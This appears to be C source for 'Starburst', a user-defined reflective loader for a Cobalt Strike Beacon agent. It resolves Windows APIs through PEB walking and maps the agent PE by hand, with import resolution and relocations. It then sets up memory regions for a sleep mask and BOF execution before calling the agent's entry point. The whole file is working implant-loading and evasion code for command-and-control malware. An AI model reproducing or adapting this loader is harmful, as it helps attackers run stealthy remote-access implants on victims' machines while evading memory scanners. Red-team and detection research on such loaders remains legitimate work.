#include <Common.h>
#include <Constexpr.h>
#include <UserData.h>

FUNC FILE *__cdecl __acrt_iob_funcs(unsigned index)
{
    STARDUST_INSTANCE
    return &(API( __iob_func )()[index]);
}

#define stdin (__acrt_iob_funcs(0))
#define stdout (__acrt_iob_funcs(1))
#define stderr (__acrt_iob_funcs(2))

FUNC BOOL ResolveApis()
{
    STARDUST_INSTANCE

    MOD( Ntdll ) = LdrModulePeb( H_MODULE_NTDLL );
    MOD( Kernel32 ) = LdrModulePeb( H_MODULE_KERNEL32 );

    RESOLVE( LoadLibraryA, Kernel32 );

    if ( !MOD( Ntdll ) || !MOD( Kernel32 ) || !API( LoadLibraryA ) )
        return FALSE;

    #define DLL_ENTRY(mod) if ( !( MOD( mod ) = API( LoadLibraryA )( #mod ) ) ) return FALSE;
    DLL_LIST
    #undef DLL_ENTRY

    #define API_ENTRY(api, mod) if ( !( RESOLVE( api, mod ) ) ) return FALSE;
    API_LIST
    #undef API_ENTRY

    return TRUE;
}

FUNC VOID Main(
    _In_ PVOID Param
) {
    STARDUST_INSTANCE
    PCUSTOM_DATA            cData               = { 0 };
    PIMAGE_DOS_HEADER       DOS_Beacon          = { 0 };
    PIMAGE_NT_HEADERS       NT_Beacon           = { 0 };
    PIMAGE_SECTION_HEADER   pBeaconSH           = { 0 };
    LPVOID                  pImportDir          = { 0 };
    LPVOID                  pRelocDir           = { 0 };
    PVOID                   pProtect            = { 0 };
    SIZE_T                  szProtect           = { 0 };
    ULONG                   oldProtect          = { 0 };
    USER_DATA               userData            = { 0 };
    ALLOCATED_MEMORY        allocMem            = { 0 };

    if (!ResolveApis())
        return;

#ifdef DEBUG
    if (API( AllocConsole )())
    {
        HWND cWindows = API( GetConsoleWindow )();
        API( freopen )("CONIN$", "r", stdin);
        API( freopen )("CONOUT$", "w", stderr);
        API( freopen )("CONOUT$", "w", stdout);
        API( ShowWindow )(cWindows, SW_RESTORE);
        API( SetForegroundWindow )(cWindows);
        API( UpdateWindow )(cWindows);
    }
#endif

    PRINT("Starburst UDRL starting...");

    cData = API( calloc )(1, sizeof(CUSTOM_DATA));
    Instance()->cData = cData;
    PRINT("cData: %p", cData);

    // Parse agent PE headers
    DOS_Beacon = PADD( Instance()->Base.Buffer, Instance()->Base.Length );
    NT_Beacon = PADD( DOS_Beacon, DOS_Beacon->e_lfanew );

    // Store agent size and calculate total stomp size
    cData->szBeacon = NT_Beacon->OptionalHeader.SizeOfImage;
    cData->szStomp = cData->szBeacon + SZ_SLEEPMASK + SZ_BOF;

    // Allocate contiguous region: [agent | sleepmask | BOF]
    cData->pStompBeacon = API( VirtualAlloc )(NULL, cData->szStomp, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    cData->pStompSleepmask = PADD( cData->pStompBeacon, cData->szBeacon );
    PRINT("pStompSleepmask: %p", cData->pStompSleepmask);

    cData->pStompBof = PADD( cData->pStompSleepmask, SZ_SLEEPMASK );
    PRINT("pStompBof: %p", cData->pStompBof);

    // Store agent entry point for later
    API( DllMain ) = PADD( cData->pStompBeacon, NT_Beacon->OptionalHeader.AddressOfEntryPoint );

    pBeaconSH = IMAGE_FIRST_SECTION( NT_Beacon );

    // Map agent sections into memory
    for (INT i = 0; i < NT_Beacon->FileHeader.NumberOfSections; i++)
    {
        PRINT("Mapping: %s start: %p end: %p", pBeaconSH[i].Name,
            PADD( cData->pStompBeacon, pBeaconSH[i].VirtualAddress ),
            PADD( cData->pStompBeacon, pBeaconSH[i].VirtualAddress, pBeaconSH[i].Misc.VirtualSize ) );

        // For .text section, calculate exec/RW region boundaries for the sleep mask
        if ( API( strcmp )(pBeaconSH[i].Name, ".text") == 0 )
        {
            cData->pStompBeaconExec = PADD( cData->pStompBeacon, pBeaconSH[i].VirtualAddress );
            cData->szBeaconExec = pBeaconSH[i].Misc.VirtualSize;
            cData->pStompBeaconRw = PADD( cData->pStompBeacon, cData->szBeaconExec );
            cData->szBeaconRw = (SIZE_T) PSUB( cData->pStompSleepmask, PADD( cData->pStompBeacon, cData->szBeaconExec ) );
        }

        MmCopy(PADD( cData->pStompBeacon, pBeaconSH[i].VirtualAddress ), PADD( DOS_Beacon, pBeaconSH[i].PointerToRawData ), pBeaconSH[i].SizeOfRawData);
    }

    // Resolve IAT
    pImportDir = PADD( cData->pStompBeacon, (&NT_Beacon->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT])->VirtualAddress );
    ResolveIAT(cData->pStompBeacon, pImportDir);

    // Process relocations
    pRelocDir = PADD( cData->pStompBeacon, (&NT_Beacon->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC])->VirtualAddress );
    ProcessRelocations(cData->pStompBeacon, C_PTR( NT_Beacon->OptionalHeader.ImageBase), pRelocDir);

    //
    // Transferring Execution (Starburst adaptation)
    //
    // CS equivalent: NtProtectVirtualMemory on .text
    // Identical in Starburst - make .text executable before calling the entry point.
    // We copy the values to local vars because NtProtectVirtualMemory can modify them.
    //
    pProtect = cData->pStompBeaconExec;
    szProtect = cData->szBeaconExec;
    API( NtProtectVirtualMemory )(NtCurrentProcess(), &pProtect, &szProtect, PAGE_EXECUTE_READ, &oldProtect);

    //
    // ── Populate CS USER_DATA ──
    //

    userData.version         = STARBURST_VERSION;
    userData.allocatedMemory = &allocMem;

    MmCopy(userData.custom, &cData, sizeof(PVOID));

    // Region 0: Beacon memory (agent image)
    allocMem.AllocatedMemoryRegions[0].Purpose       = PURPOSE_BEACON_MEMORY;
    allocMem.AllocatedMemoryRegions[0].AllocationBase = cData->pStompBeacon;
    allocMem.AllocatedMemoryRegions[0].RegionSize     = cData->szBeacon;

    allocMem.AllocatedMemoryRegions[0].Sections[0].Label          = LABEL_TEXT;
    allocMem.AllocatedMemoryRegions[0].Sections[0].BaseAddress    = cData->pStompBeaconExec;
    allocMem.AllocatedMemoryRegions[0].Sections[0].VirtualSize    = cData->szBeaconExec;
    allocMem.AllocatedMemoryRegions[0].Sections[0].CurrentProtect = PAGE_EXECUTE_READ;
    allocMem.AllocatedMemoryRegions[0].Sections[0].MaskSection    = TRUE;

    allocMem.AllocatedMemoryRegions[0].Sections[1].Label          = LABEL_DATA;
    allocMem.AllocatedMemoryRegions[0].Sections[1].BaseAddress    = cData->pStompBeaconRw;
    allocMem.AllocatedMemoryRegions[0].Sections[1].VirtualSize    = cData->szBeaconRw;
    allocMem.AllocatedMemoryRegions[0].Sections[1].CurrentProtect = PAGE_READWRITE;
    allocMem.AllocatedMemoryRegions[0].Sections[1].MaskSection    = TRUE;

    // Region 1: Sleepmask memory
    allocMem.AllocatedMemoryRegions[1].Purpose       = PURPOSE_SLEEPMASK_MEMORY;
    allocMem.AllocatedMemoryRegions[1].AllocationBase = cData->pStompSleepmask;
    allocMem.AllocatedMemoryRegions[1].RegionSize     = SZ_SLEEPMASK;

    allocMem.AllocatedMemoryRegions[1].Sections[0].Label          = LABEL_BUFFER;
    allocMem.AllocatedMemoryRegions[1].Sections[0].BaseAddress    = cData->pStompSleepmask;
    allocMem.AllocatedMemoryRegions[1].Sections[0].VirtualSize    = SZ_SLEEPMASK;
    allocMem.AllocatedMemoryRegions[1].Sections[0].CurrentProtect = PAGE_READWRITE;
    allocMem.AllocatedMemoryRegions[1].Sections[0].MaskSection    = TRUE;

    // Region 2: BOF memory
    allocMem.AllocatedMemoryRegions[2].Purpose       = PURPOSE_BOF_MEMORY;
    allocMem.AllocatedMemoryRegions[2].AllocationBase = cData->pStompBof;
    allocMem.AllocatedMemoryRegions[2].RegionSize     = SZ_BOF;

    allocMem.AllocatedMemoryRegions[2].Sections[0].Label          = LABEL_BUFFER;
    allocMem.AllocatedMemoryRegions[2].Sections[0].BaseAddress    = cData->pStompBof;
    allocMem.AllocatedMemoryRegions[2].Sections[0].VirtualSize    = SZ_BOF;
    allocMem.AllocatedMemoryRegions[2].Sections[0].CurrentProtect = PAGE_READWRITE;
    allocMem.AllocatedMemoryRegions[2].Sections[0].MaskSection    = TRUE;

    PRINT("USER_DATA: version=%x beacon=%p sm=%p bof=%p",
        userData.version,
        allocMem.AllocatedMemoryRegions[0].AllocationBase,
        allocMem.AllocatedMemoryRegions[1].AllocationBase,
        allocMem.AllocatedMemoryRegions[2].AllocationBase);

    // Transfer execution via CS DLL_BEACON_USER_DATA convention

    API( NtFlushInstructionCache )((HANDLE)-1, NULL, 0);

    PRINTB("Calling agent entry!");
    API( DllMain )(cData->pStompBeacon, DLL_BEACON_USER_DATA, &userData);
    API( DllMain )(cData->pStompBeacon, DLL_PROCESS_ATTACH, NULL);
}
